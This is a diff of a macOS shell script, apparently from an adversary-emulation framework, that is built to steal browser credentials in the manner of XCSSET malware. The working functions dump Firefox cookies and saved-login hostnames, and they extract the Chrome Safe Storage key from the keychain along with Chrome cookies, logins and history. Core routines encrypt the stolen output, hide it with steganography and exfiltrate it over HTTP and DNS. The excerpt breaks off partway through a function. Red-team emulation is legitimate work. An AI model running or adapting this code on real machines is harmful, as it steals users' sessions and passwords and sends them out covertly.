@@ -1,26 +1,26 @@
 #!/bin/sh
-# POSIX-compliant shell script - avoid bashisms
-# Script Name: 1539_web_session_cookies.sh
-# MITRE ATT&CK Technique: 1539
+# POSIX-compliant
+# Procedure Name: web_session_cookies
+# Tactic: Credential Access
+# Technique: T1539
+# GUID: 0bb6114d-b902-4f42-b34c-4364b9d2bd9f
+# Intent: Steal web session cookies and browser credential data from macOS browsers, emulating XCSSET malware credential theft techniques
 # Author: @darmado | https://x.com/darmad0
-# Date: 2025-05-28
+# created: 2025-05-28
+# Updated: 2025-05-30
 # Version: 1.0.0
+# License: Apache 2.0
 
-# Description:
-# Steal web session cookies and browser credential data from macOS browsers, emulating XCSSET malware credential theft techniques
-# MITRE ATT&CK Tactic: Credential Access
-# Procedure GUID: 12345678-1234-5678-9abc-123456789012
-# Generated from YAML procedure definition using build_procedure.py
-# The script uses native macOS commands and APIs for maximum compatibility.
+# Core function Info:
+# This is a standalone base script template that can be used to build any technique.
 
 #------------------------------------------------------------------------------
 # Configuration Section
 #------------------------------------------------------------------------------
-
+NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
-SUBTECHNIQUE_ID=""
+TACTIC="Credential Access" #replace with you coresponding tactic
+TTP_ID="T1539" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -38,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="1539_web_session_cookies"
+
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -92,13 +92,28 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
+ALL=false
+FIREFOX=false
+CHROME=false
+SAFARI=false
+
+FIREFOX_PROFILES_PATH="~/Library/Application Support/Firefox/Profiles"
+CHROME_DATA_PATH="~/Library/Application Support/Google/Chrome/Default"
+SAFARI_COOKIES_PATH="~/Library/Cookies"
+
+# Procedure Information (set by build system)
+PROCEDURE_NAME="web_session_cookies"  # Set by build system from YAML procedure_name field
+
+# Function execution tracking
+FUNCTION_LANG=""  # Ued by log_output at execution time
+
 # Logging Settings
 HOME_DIR="${HOME}"
 LOG_DIR="./logs"  # Simple path to logs in current directory
-LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
+LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
 LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
 LOG_ENABLED=false
-SYSLOG_TAG="${NAME}"
+SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
 
 # Default settings
 DEBUG=false
@@ -109,32 +124,10 @@ STEG_EXTRACT=false # Extract hidden data from steganography
 STEG_EXTRACT_FILE="" # File to extract hidden data from
 
 # OPSEC Check Settings (enabled by build script based on YAML configuration)
-CHECK_PERMS="true"
+CHECK_PERMS="false"
 CHECK_FDA="true"
 CHECK_DB_LOCK="false"
 
-ALL=false
-FIREFOX=false
-CHROME=false
-SAFARI=false
-
-FIREFOX_PROFILES_PATH="~/Library/Application Support/Firefox/Profiles"
-CHROME_DATA_PATH="~/Library/Application Support/Google/Chrome/Default"
-SAFARI_COOKIES_PATH="~/Library/Cookies"
-
-# MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with your corresponding tactic
-TTP_ID="T1082" #replace with your corresponding ttp_id
-SUBTECHNIQUE_ID=""
-
-TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
-TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCODE="T1140" # DO NOT MODIFY
-TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
-TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
 
 # Output Configuration
 FORMAT=""          # json, csv, or empty for raw
@@ -170,7 +163,7 @@ DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
 # Purpose: Get the current timestamp in a consistent format
 # Inputs: None
 # Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
-# Side Effects: None
+# - None
 core_get_timestamp() {
     # Use direct command to avoid variable expansion issues
     date "+%Y-%m-%d %H:%M:%S"
@@ -179,7 +172,7 @@ core_get_timestamp() {
 # Purpose: Generate a unique job ID for tracking script execution
 # Inputs: None
 # Outputs: 8-character hexadecimal job ID
-# Side Effects: None
+# - None
 core_generate_job_id() {
     # Use openssl to generate random hex string for job tracking
     # Fallback to date-based ID if openssl not available
@@ -197,7 +190,7 @@ core_generate_job_id() {
 # Purpose: Print debug messages to stderr when debug mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stderr)
-# Side Effects: Writes to stderr if DEBUG=true
+# - Writes to stderr if DEBUG=true
 core_debug_print() {
     if [ "$DEBUG" = true ]; then
         local timestamp=$(core_get_timestamp)
@@ -208,12 +201,12 @@ core_debug_print() {
 # Purpose: Print verbose messages to stdout when verbose mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stdout)
-# Side Effects: Writes to stdout if VERBOSE=true
+# - Writes to stdout if VERBOSE=true
 
 # Purpose: Handle errors consistently with proper formatting and logging
 # Inputs: $1 - Error message
 # Outputs: None (prints directly to stderr)
-# Side Effects: 
+# - 
 #   - Writes to stderr
 #   - Logs error message if LOG_ENABLED=true
 #   - Returns error code 1
@@ -235,7 +228,7 @@ core_handle_error() {
 #   $2 - Status type (info, error, etc.), defaults to "info"
 #   $3 - Skip data flag (true/false), defaults to false
 # Outputs: None
-# Side Effects:
+# 
 #   - Creates log directory if it doesn't exist
 #   - Writes to log file if LOG_ENABLED=true
 #   - Rotates log file if size exceeds LOG_MAX_SIZE
@@ -248,7 +241,7 @@ core_log_output() {
     
     if [ "$LOG_ENABLED" = true ]; then
         # Ensure log directory exists
-        if [ ! -d "$LOG_DIR" ]; then
+            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
@@ -262,7 +255,7 @@ core_log_output() {
         fi
         
         # Log detailed entry
-        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
+        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
             "$(core_get_timestamp)" \
             "$status" \
             "$$" \
@@ -274,7 +267,9 @@ core_log_output() {
             "${FORMAT:-raw}" \
             "$ENCODING_TYPE" \
             "${ENCRYPTION_TYPE:-none}" \
-            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
+            "${EXFIL_TYPE:-none}" \
+            "${FUNCTION_LANG:-shell}" \
+            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
             
         if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
             "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
@@ -286,7 +281,7 @@ core_log_output() {
         fi
 
         # Also log to syslog
-        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
+        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
     fi
     
     # Output to stdout if in debug mode only
@@ -300,7 +295,7 @@ core_log_output() {
 #  $1 - Input string to validate
 #  $2 - Validation type (string|integer|domain|url|file_path)
 #Outputs: 0 if valid, 1 if invalid
-#Side Effects: Prints error message to stderr on validation failure
+#- Prints error message to stderr on validation failure
 core_validate_input() {
     local input="$1"
     local validation_type="$2"
@@ -375,7 +370,7 @@ core_validate_input() {
 # Purpose: Extract domain from URL for validation
 # Inputs: $1 - URL string
 # Outputs: Domain part of URL
-# Side Effects: None
+# - None
 core_extract_domain_from_url() {
     local url="$1"
     "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -384,7 +379,7 @@ core_extract_domain_from_url() {
 # Purpose: Validate that essential commands are available before script execution
 # Inputs: None
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Returns 1 if any essential command is missing
 #   - Calls core_handle_error on missing commands
 core_validate_command() {
@@ -408,7 +403,7 @@ core_validate_command() {
 # Purpose: Check if a domain resolves to a valid IP address
 # Inputs: $1 - Domain to check
 # Outputs: 0 if domain resolves, 1 if not
-# Side Effects: Prints error message if domain doesn't resolve
+# - Prints error message if domain doesn't resolve
 core_validate_domain() {
     local domain="$1"
     
@@ -445,7 +440,7 @@ core_validate_domain() {
 # Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
 # Inputs: $@ - All command-line arguments passed to the script
 # Outputs: None
-# Side Effects: Sets global flag variables based on command-line options
+# - Sets global flag variables based on command-line options
 core_parse_args() {
     # Track unknown arguments and missing values for error reporting
     UNKNOWN_ARGS=""
@@ -674,7 +669,7 @@ EOF
 #   $1 - Raw output data to process
 #   $2 - Data source identifier (defaults to "generic")
 # Outputs: Processed output (formatted/encoded/encrypted as requested)
-# Side Effects:
+# Logic:
 #   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
 core_process_output() {
     local output="$1"
@@ -688,10 +683,10 @@ core_process_output() {
     if [ -n "$FORMAT" ]; then
         if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
             # For JSON, only use raw data here - we'll add transformation metadata at the end
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
         else
             # For other formats, just format the raw output
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
         fi
         core_debug_print "Output formatted as $FORMAT"
     fi
@@ -738,7 +733,7 @@ core_process_output() {
 #   $3 - Data source identifier (defaults to "generic")
 #   $4-7 - Additional parameters for JSON metadata
 # Outputs: Formatted data
-# Side Effects: None
+# - None
 core_format_output() {
     local output="$1"
     local format="$2"
@@ -754,7 +749,7 @@ core_format_output() {
     
     case "$format" in
         json|json-lines)
-            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
+            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
             ;;
         csv)
             formatted=$(core_format_as_csv "$output")
@@ -777,7 +772,7 @@ core_format_output() {
 #   $6 - Encryption method
 #   $7 - Whether steganography is used (true/false)
 # Outputs: JSON-formatted string with data and metadata
-# Side Effects: None
+# - None
 core_format_as_json() {
     local output="$1"
     local data_source="${2:-generic}"
@@ -798,7 +793,7 @@ core_format_as_json() {
     json_output="$json_output
   \"jobId\": \"$JOB_ID\","
     json_output="$json_output
-  \"dataSource\": \"$data_source\","
+  \"procedure\": \"$PROCEDURE_NAME\","
     
     # Always include encoding and encryption status
         json_output="$json_output
@@ -901,7 +896,7 @@ core_format_as_csv() {
 #   $1 - Output data to encode
 #   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
 # Outputs: Encoded data according to specified method
-# Side Effects: None
+# - None
 core_encode_output() {
     local output="$1"
     local encode_type="$2"
@@ -943,7 +938,7 @@ core_encode_output() {
 #   $2 - Encryption method (none|aes|gpg|xor)
 #   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
 # Outputs: Encrypted data or original data if no encryption
-# Side Effects: None (delegated to specific encryption functions)
+# - None (delegated to specific encryption functions)
 core_encrypt_output() {
     local data="$1"
     local method="$2"
@@ -991,7 +986,7 @@ core_encrypt_output() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: AES-256-CBC encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "aes" on success
 #   - Writes error message to stderr on failure
 encrypt_with_aes() {
@@ -1018,7 +1013,7 @@ encrypt_with_aes() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: GPG symmetrically encrypted data in ASCII armor format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "gpg" on success
 #   - Writes error message to stderr on failure/if GPG not found
 encrypt_with_gpg() {
@@ -1045,7 +1040,7 @@ encrypt_with_gpg() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: XOR encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "xor" on success
 #   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
 encrypt_with_xor() {
@@ -1085,7 +1080,7 @@ encrypt_with_xor() {
 # Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
 # Inputs: $1 - Data to encode
 # Outputs: Base64 URL-safe encoded data
-# Side Effects: None
+# - None
 core_url_safe_encode() {
     local data="$1"
     local encoded
@@ -1102,7 +1097,7 @@ core_url_safe_encode() {
 # Purpose: DNS-safe encode data for DNS exfiltration
 # Inputs: $1 - Data to encode  
 # Outputs: Base64 DNS-safe encoded data
-# Side Effects: None
+# - None
 core_dns_safe_encode() {
     local data="$1"
     local encoded
@@ -1119,7 +1114,7 @@ core_dns_safe_encode() {
 # Purpose: Generate user agent string for HTTP requests
 # Inputs: None
 # Outputs: User agent string
-# Side Effects: None
+# - None
 core_get_user_agent() {
     $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 }
@@ -1127,7 +1122,7 @@ core_get_user_agent() {
 # Purpose: Prepare proxy argument for curl if needed
 # Inputs: None - uses global PROXY_URL variable
 # Outputs: Proxy argument for curl or empty string
-# Side Effects: May modify global PROXY_URL to add protocol prefix
+# - May modify global PROXY_URL to add protocol prefix
 core_prepare_proxy_arg() {
     local proxy_arg=""
     
@@ -1144,7 +1139,7 @@ core_prepare_proxy_arg() {
 # Purpose: Normalize URI by ensuring it has http:// prefix
 # Inputs: $1 - URI to normalize
 # Outputs: Normalized URI with protocol prefix
-# Side Effects: None
+# - None
 core_normalize_uri() {
     local uri="$1"
     
@@ -1157,7 +1152,7 @@ core_normalize_uri() {
 # Purpose: Extract domain from a full URI
 # Inputs: $1 - Full URI
 # Outputs: Domain part of the URI
-# Side Effects: None
+# - None
 core_extract_domain() {
     local uri="$1"
     "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -1167,7 +1162,7 @@ core_extract_domain() {
 # Inputs: 
 #   $1 - Raw data
 # Outputs: Data with optional start/end markers
-# Side Effects: None (uses global EXFIL_START/EXFIL_END)
+# - None (uses global EXFIL_START/EXFIL_END)
 core_prepare_exfil_data() {
     local data="$1"
     
@@ -1185,7 +1180,7 @@ core_prepare_exfil_data() {
 # Inputs:
 #   $1 - Domain to send key to
 # Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
-# Side Effects: Makes DNS request
+# - Makes DNS request
 core_send_key_via_dns() {
     local domain="$1"
     local encrypted_key=""
@@ -1228,7 +1223,7 @@ core_send_key_via_dns() {
 #   $1 - Encoded data
 #   $2 - Optional encrypted key (empty if key sent via DNS)
 # Outputs: JSON payload string
-# Side Effects: None
+# - None
 core_generate_json_payload() {
     local encoded_data="$1"
     local encrypted_key="$2"
@@ -1272,7 +1267,7 @@ EOF
 # Purpose: Determine appropriate content type for HTTP exfiltration
 # Inputs: None (uses global ENCODE variable)
 # Outputs: Content type string
-# Side Effects: None
+# - None
 core_get_content_type() {
     local content_type="text/plain"
     if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
@@ -1287,7 +1282,7 @@ core_get_content_type() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes HTTP request
+# - Makes HTTP request
 core_exfil_http_post() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1333,7 +1328,7 @@ core_exfil_http_post() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple HTTP requests
+# - Makes multiple HTTP requests
 core_exfil_http_get() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1407,7 +1402,7 @@ core_exfil_http_get() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple DNS requests
+# - Makes multiple DNS requests
 core_exfil_dns() {
     local data="$1"
     
@@ -1483,7 +1478,7 @@ core_exfil_dns() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Logs exfiltration attempt if LOG_ENABLED=true
 #   - Performs network requests to exfiltrate data
 #   - May modify data for transport (encoding, chunking)
@@ -1537,7 +1532,7 @@ core_exfiltrate_data() {
 # Inputs:
 #   $1 - Processed data (after formatting/encoding/encryption)
 # Outputs: None (writes to various destinations)
-# Side Effects:
+# Logic:
 #   - Logs output if LOG_ENABLED=true
 #   - Exfiltrates data if EXFIL=true
 #   - Always prints data to stdout
@@ -1569,7 +1564,7 @@ core_transform_output() {
 # Purpose: Extract hidden data from a steganography image
 # Inputs: $1 - Image file with hidden data
 # Outputs: Extracted and decoded data
-# Side Effects: None
+# - None
 core_extract_steganography() {
     local steg_file="$1"
     
@@ -1605,7 +1600,7 @@ core_extract_steganography() {
 # Purpose: Perform steganography by hiding data in an image
 # Inputs: None (uses global variables)
 # Outputs: Status message
-# Side Effects: Creates output image file
+# - Creates output image file
 core_steganography() {
     # Define local variables
     local message=""
@@ -1678,7 +1673,7 @@ core_steganography() {
 # Purpose: Apply steganography to data in the processing pipeline
 # Inputs: $1 - Data to hide in steganography
 # Outputs: Status message (actual data is written to file)
-# Side Effects: Creates output image file
+# - Creates output image file
 core_apply_steganography() {
     local data_to_hide="$1"
     local carrier_image=""
@@ -1721,7 +1716,7 @@ core_apply_steganography() {
 #   $3 - Write permission required (true/false)
 #   $4 - Execute permission required (true/false)
 # Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
-# Side Effects: Logs debug information
+# - Logs debug information
 core_check_perms() {
     local file="$1"
     local read_required="$2"
@@ -1750,7 +1745,7 @@ core_check_perms() {
     return 0
 }
 
-# Side Effects: None
+# - None
 # Note: Simple implementation for YAML check_fda
 core_check_fda() {
     [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
@@ -1759,7 +1754,7 @@ core_check_fda() {
 # Purpose: Check if database is locked by another process
 # Inputs: $1 - Database path
 # Outputs: 0 if database is not locked, 1 if locked
-# Side Effects: None
+# - None
 # Note: Comprehensive implementation checking lock files, processes, and database state
 core_check_db_lock() {
     local db_path="$1"
@@ -1851,6 +1846,9 @@ core_main() {
 # Execute main logic
 raw_output=""
 
+# Set global function language for this procedure
+FUNCTION_LANG="shell"
+
 # Execute functions for -a|--all
 if [ "$ALL" = true ]; then
     core_debug_print "Executing functions for -a|--all"
@@ -1883,8 +1881,8 @@ if [ "$SAFARI" = true ]; then
     raw_output="${raw_output}${result}\n"
 fi
 
-# Set data source
-data_source="1539_web_session_cookies"
+# Set procedure name for processing
+procedure="web_session_cookies"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -1893,7 +1891,7 @@ data_source="1539_web_session_cookies"
         fi  
     fi
     # Process the output (format, encode, encrypt)
-    processed_output=$(core_process_output "$raw_output" "$data_source")
+    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
     
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
@@ -1903,7 +1901,7 @@ data_source="1539_web_session_cookies"
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
 # Outputs: 0 if valid, 1 if invalid
-# Side Effects: Prints error messages for invalid arguments but continues execution
+# - Prints error messages for invalid arguments but continues execution
 core_validate_parsed_args() {
     local validation_errors=""
     local has_valid_actions=false
@@ -2035,7 +2033,7 @@ core_validate_parsed_args() {
 # Purpose: Generate encryption key if encryption is enabled
 # Inputs: None (uses global ENCRYPT variable)
 # Outputs: None
-# Side Effects: Sets global ENCRYPT_KEY variable
+# - Sets global ENCRYPT_KEY variable
 core_generate_encryption_key() {
     if [ "$ENCRYPT" != "none" ]; then
         ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
@@ -2051,34 +2049,34 @@ core_generate_encryption_key() {
 # Functions from YAML procedure
 
 # Function: steal_firefox_cookies
-# Description: steal_firefox_cookies - Generated from YAML procedure
+# Description: steal_firefox_cookies - Generated from YAML
 steal_firefox_cookies() {
-    $CMD_PRINTF "FIREFOX_COOKIES|accessing|Firefox profiles directory\\n"
+    printf "FIREFOX_COOKIES|accessing|Firefox profiles directory\\n"
     
     # Find Firefox profiles - NO keychain access needed (DBs are not encrypted)
     for profile in ~/Library/Application\ Support/Firefox/Profiles/*; do
         if [ -d "$profile" ]; then
-            $CMD_PRINTF "FIREFOX_PROFILE|found|$profile\\n"
+            printf "FIREFOX_PROFILE|found|$profile\\n"
             
             # Extract cookies from cookies.sqlite (not encrypted - direct access)
             if [ -f "$profile/cookies.sqlite" ]; then
-                cookie_count=$($CMD_SQLITE3 "$profile/cookies.sqlite" "SELECT COUNT(*) FROM moz_cookies;" 2>/dev/null || $CMD_PRINTF "%s\n" "0")
-                $CMD_PRINTF "FIREFOX_COOKIES|count|$cookie_count\\n"
+                cookie_count=$(sqlite3 "$profile/cookies.sqlite" "SELECT COUNT(*) FROM moz_cookies;" 2>/dev/null || echo "0")
+                printf "FIREFOX_COOKIES|count|$cookie_count\\n"
                 
                 # Extract actual cookie data (no decryption needed)
-                $CMD_SQLITE3 "$profile/cookies.sqlite" "SELECT host, name, value, path, expiry FROM moz_cookies LIMIT 10;" 2>/dev/null | while IFS='|' read -r host name value path expiry; do
-                    $CMD_PRINTF "FIREFOX_COOKIE|%s|%s|%s|%s|%s\\n" "$host" "$name" "$value" "$path" "$expiry"
+                sqlite3 "$profile/cookies.sqlite" "SELECT host, name, value, path, expiry FROM moz_cookies LIMIT 10;" 2>/dev/null | while IFS='|' read -r host name value path expiry; do
+                    printf "FIREFOX_COOKIE|%s|%s|%s|%s|%s\\n" "$host" "$name" "$value" "$path" "$expiry"
                 done
             fi
             
             # Extract saved passwords from logins.json (not encrypted - direct access)
             if [ -f "$profile/logins.json" ]; then
-                login_count=$($CMD_GREP -o '"hostname"' "$profile/logins.json" 2>/dev/null | $CMD_WC -l | $CMD_TR -d ' ')
-                $CMD_PRINTF "FIREFOX_LOGINS|count|$login_count\\n"
+                login_count=$(grep -o '"hostname"' "$profile/logins.json" 2>/dev/null | wc -l | tr -d ' ')
+                printf "FIREFOX_LOGINS|count|$login_count\\n"
                 
                 # Extract hostnames from saved logins (no decryption needed)
-                $CMD_GREP -o '"hostname":"[^"]*"' "$profile/logins.json" 2>/dev/null | $CMD_SED 's/"hostname":"//;s/"//' | while read -r hostname; do
-                    $CMD_PRINTF "FIREFOX_LOGIN|hostname|%s\\n" "$hostname"
+                grep -o '"hostname":"[^"]*"' "$profile/logins.json" 2>/dev/null | sed 's/"hostname":"//;s/"//' | while read -r hostname; do
+                    printf "FIREFOX_LOGIN|hostname|%s\\n" "$hostname"
                 done
             fi
         fi
@@ -2087,146 +2085,146 @@ steal_firefox_cookies() {
 
 
 # Function: steal_chrome_credentials
-# Description: steal_chrome_credentials - Generated from YAML procedure
+# Description: steal_chrome_credentials - Generated from YAML
 steal_chrome_credentials() {
-    $CMD_PRINTF "CHROME_CREDENTIALS|accessing|Chrome data directory\\n"
+    printf "CHROME_CREDENTIALS|accessing|Chrome data directory\\n"
     
     chrome_dir="$HOME/Library/Application Support/Google/Chrome/Default"
     
     if [ -d "$chrome_dir" ]; then
         # Extract Chrome Safe Storage key for decryption (like XCSSET does)
-        $CMD_PRINTF "CHROME_SAFE_STORAGE|extracting|Chrome encryption key\\n"
-        chrome_key=$(security find-generic-password -ga "Chrome" 2>&1 | $CMD_GREP "password:" | $CMD_SED 's/password: "//' | $CMD_SED 's/"$//')
+        printf "CHROME_SAFE_STORAGE|extracting|Chrome encryption key\\n"
+        chrome_key=$(security find-generic-password -ga "Chrome" 2>&1 | grep "password:" | sed 's/password: "//' | sed 's/"$//')
         if [ -n "$chrome_key" ]; then
-            $CMD_PRINTF "CHROME_SAFE_STORAGE|key|%s\\n" "$chrome_key"
-            $CMD_PRINTF "CHROME_SAFE_STORAGE|encoding|base64\\n"
+            printf "CHROME_SAFE_STORAGE|key|%s\\n" "$chrome_key"
+            printf "CHROME_SAFE_STORAGE|encoding|base64\\n"
             
             # Decode the base64 key
-            decoded_key=$($CMD_PRINTF "%s\n" "$chrome_key" | base64 -d 2>/dev/null | hexdump -ve '1/1 "%.2x"' || $CMD_PRINTF "%s\n" "decode_failed")
-            $CMD_PRINTF "CHROME_SAFE_STORAGE|decoded|%s\\n" "$decoded_key"
+            decoded_key=$(echo "$chrome_key" | base64 -d 2>/dev/null | hexdump -ve '1/1 "%.2x"' || echo "decode_failed")
+            printf "CHROME_SAFE_STORAGE|decoded|%s\\n" "$decoded_key"
         else
-            $CMD_PRINTF "CHROME_SAFE_STORAGE|error|Key not found\\n"
+            printf "CHROME_SAFE_STORAGE|error|Key not found\\n"
         fi
         
         # Extract cookies (requires decryption with Safe Storage key)
         if [ -f "$chrome_dir/Cookies" ]; then
             cookie_size=$(stat -f%z "$chrome_dir/Cookies")
-            $CMD_PRINTF "CHROME_COOKIES|found|%s bytes\\n" "$cookie_size"
+            printf "CHROME_COOKIES|found|%s bytes\\n" "$cookie_size"
             
             # Count encrypted cookies
-            cookie_count=$($CMD_SQLITE3 "$chrome_dir/Cookies" "SELECT COUNT(*) FROM cookies;" 2>/dev/null || $CMD_PRINTF "%s\n" "0")
-            $CMD_PRINTF "CHROME_COOKIES|count|%s (encrypted)\\n" "$cookie_count"
+            cookie_count=$(sqlite3 "$chrome_dir/Cookies" "SELECT COUNT(*) FROM cookies;" 2>/dev/null || echo "0")
+            printf "CHROME_COOKIES|count|%s (encrypted)\\n" "$cookie_count"
             
             # Show encrypted cookie data structure
-            $CMD_SQLITE3 "$chrome_dir/Cookies" "SELECT host_key, name, encrypted_value FROM cookies LIMIT 3;" 2>/dev/null | while IFS='|' read -r host name encrypted; do
-                $CMD_PRINTF "CHROME_COOKIE_ENCRYPTED|%s|%s|%s\\n" "$host" "$name" "$encrypted"
+            sqlite3 "$chrome_dir/Cookies" "SELECT host_key, name, encrypted_value FROM cookies LIMIT 3;" 2>/dev/null | while IFS='|' read -r host name encrypted; do
+                printf "CHROME_COOKIE_ENCRYPTED|%s|%s|%s\\n" "$host" "$name" "$encrypted"
             done
         fi
         
         # Extract saved passwords from Login Data (requires Safe Storage key)
         if [ -f "$chrome_dir/Login Data" ]; then
             login_size=$(stat -f%z "$chrome_dir/Login Data")
-            $CMD_PRINTF "CHROME_LOGINS|found|%s bytes\\n" "$login_size"
+            printf "CHROME_LOGINS|found|%s bytes\\n" "$login_size"
             
             # Extract login URLs and usernames (some data readable)
-            $CMD_SQLITE3 "$chrome_dir/Login Data" "SELECT origin_url, username_value FROM logins LIMIT 10;" 2>/dev/null | while IFS='|' read -r url username; do
-                $CMD_PRINTF "CHROME_LOGIN|%s|%s\\n" "$url" "$username"
+            sqlite3 "$chrome_dir/Login Data" "SELECT origin_url, username_value FROM logins LIMIT 10;" 2>/dev/null | while IFS='|' read -r url username; do
+                printf "CHROME_LOGIN|%s|%s\\n" "$url" "$username"
             done
             
             # Show encrypted password structure
-            $CMD_SQLITE3 "$chrome_dir/Login Data" "SELECT origin_url, password_value FROM logins LIMIT 3;" 2>/dev/null | while IFS='|' read -r url encrypted_pass; do
-                $CMD_PRINTF "CHROME_PASSWORD_ENCRYPTED|%s|%s\\n" "$url" "$encrypted_pass"
+            sqlite3 "$chrome_dir/Login Data" "SELECT origin_url, password_value FROM logins LIMIT 3;" 2>/dev/null | while IFS='|' read -r url encrypted_pass; do
+                printf "CHROME_PASSWORD_ENCRYPTED|%s|%s\\n" "$url" "$encrypted_pass"
             done
         fi
         
         # Extract browsing history (not encrypted)
         if [ -f "$chrome_dir/History" ]; then
-            history_count=$($CMD_SQLITE3 "$chrome_dir/History" "SELECT COUNT(*) FROM urls;" 2>/dev/null || $CMD_PRINTF "%s\n" "0")
-            $CMD_PRINTF "CHROME_HISTORY|count|%s\\n" "$history_count"
